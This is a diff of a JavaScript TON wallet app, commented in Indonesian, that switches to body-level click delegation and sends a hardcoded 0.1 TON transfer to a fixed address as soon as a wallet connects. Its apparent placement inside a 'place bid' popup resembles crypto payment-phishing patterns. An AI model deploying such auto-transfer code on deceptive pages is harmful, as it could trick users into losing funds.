@@ -1,4 +1,4 @@
-// TON Transfer App - Final & Conflict-Safe Version
+// TON Transfer App - The Final Robust Version with Event Delegation
 (function() {
     class TONTransferApp {
         constructor() {
@@ -6,23 +6,21 @@
             this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
             this.staticAmount = "0.1";
             this.mainButton = null;
-            this.popupContainer = null;
             this.init();
         }
 
         init() {
             try {
-                this.mainButton = document.getElementById('mainButton');
-                // HAPUS BARIS INI KARENA MUTATIONOBSERVER TIDAK DIGUNAKAN LAGI
-                // this.popupContainer = document.querySelector('.js-place-bid-popup');
-                
+                // Tidak perlu lagi mencari tombol di sini, kita akan gunakan event delegation
                 this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                     manifestUrl: window.location.origin + '/ton-simple-html/tonconnect-manifest.json'
                 });
 
                 this.setupEventListeners();
                 this.setupConnectionListener();
-                this.updateMainButtonState();
+                
+                // PANGGIL INI UNTUK MEMPERBARUI STATUS TOMBOL AWAL SAAT DIMUAT
+                this.updateMainButtonState(); 
                 
                 console.log('TON Connect UI initialized successfully');
             } catch (error) {
@@ -32,15 +30,16 @@
         }
 
         setupEventListeners() {
-            this.mainButton.addEventListener('click', () => {
-                if (this.tonConnectUI.connected) {
-                    this.disconnectWallet();
-                } else {
-                    this.connectWallet();
+            // Gunakan event delegation pada body untuk menangkap klik tombol
+            document.body.addEventListener('click', (event) => {
+                if (event.target.id === 'mainButton') {
+                    if (this.tonConnectUI.connected) {
+                        this.disconnectWallet();
+                    } else {
+                        this.connectWallet();
+                    }
                 }
             });
-
-            // HAPUS SELURUH BLOK MUTATIONOBSERVER KARENA TIDAK BERFUNGSI
         }
 
         setupConnectionListener() {
@@ -50,22 +49,23 @@
         }
 
         updateMainButtonState() {
-            if (this.tonConnectUI.connected) {
-                this.mainButton.textContent = '✅ Connected';
-                this.mainButton.className = 'btn btn-success btn-block';
-            } else {
-                this.mainButton.textContent = 'Connect Wallet & Transfer';
-                this.mainButton.className = 'btn btn-primary btn-block';
+            // Pastikan tombol ada sebelum mencoba memperbarui statusnya
+            this.mainButton = document.getElementById('mainButton');
+            if (this.mainButton) {
+                if (this.tonConnectUI.connected) {
+                    this.mainButton.textContent = '✅ Connected';
+                    this.mainButton.className = 'btn btn-success btn-block';
+                } else {
+                    this.mainButton.textContent = 'Connect Wallet & Transfer';
+                    this.mainButton.className = 'btn btn-primary btn-block';
+                }
             }
         }
 
         async connectWallet() {
             this.showStatus('Opening wallet...', 'loading');
             try {
-                // TUNGGU SAMPAI KONEKSI BERHASIL SEBELUM LANJUT
                 await this.tonConnectUI.connectWallet();
-
-                // PANGGIL TRANSAKSI SECARA LANGSUNG SETELAH KONEKSI BERHASIL
                 this.sendTransaction();
             } catch (error) {
                 this.showStatus('Connection failed: ' + error.message, 'error');
@@ -89,9 +89,7 @@
                     this.showStatus('Wallet not connected. Please connect first.', 'error');
                     return;
                 }
-
                 const amountInNano = (parseFloat(this.staticAmount) * 1000000000).toString();
-
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [{
@@ -99,9 +97,7 @@
                         amount: amountInNano
                     }]
                 };
-
                 const result = await this.tonConnectUI.sendTransaction(transaction);
-                
                 this.showStatus('✅ Transfer successful!', 'success');
             } catch (error) {
                 console.error('Transaction failed:', error);
@@ -114,7 +110,6 @@
             if (statusEl) {
                 statusEl.textContent = message;
                 statusEl.className = `status-message status-${type}`;
-                
                 if (type === 'success') {
                     statusEl.style.display = 'block';
                     setTimeout(() => {
